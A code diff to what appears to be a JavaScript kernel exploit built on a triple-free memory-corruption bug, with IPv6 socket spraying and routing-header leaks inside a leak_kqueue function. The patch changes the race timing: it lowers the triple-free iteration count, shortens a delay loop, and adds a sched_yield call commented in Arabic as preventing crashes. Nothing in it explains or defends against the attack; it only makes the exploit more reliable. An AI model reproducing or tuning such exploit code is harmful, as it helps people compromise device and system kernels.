@@ -118,7 +118,7 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 10;
+var TRIPLEFREE_ITERATIONS = 7;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -1658,10 +1658,8 @@ function leak_kqueue() {
 
     while (inner_tries < INNER_MAX) {
 
-      // micro‑delay ثابت (بديل debug)
-      for (var d = 0; d < 40; d++) {
-        /* noop */
-      }
+      // دبق خفيف
+      for (var d = 0; d < 25; d++) {}
 
       get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
@@ -1673,7 +1671,11 @@ function leak_kqueue() {
         break;
       }
 
-      
+      // منع الكراش
+      if ((inner_tries % 50) == 0) {
+        sched_yield();
+      }
+
       inner_tries++;
     }
       
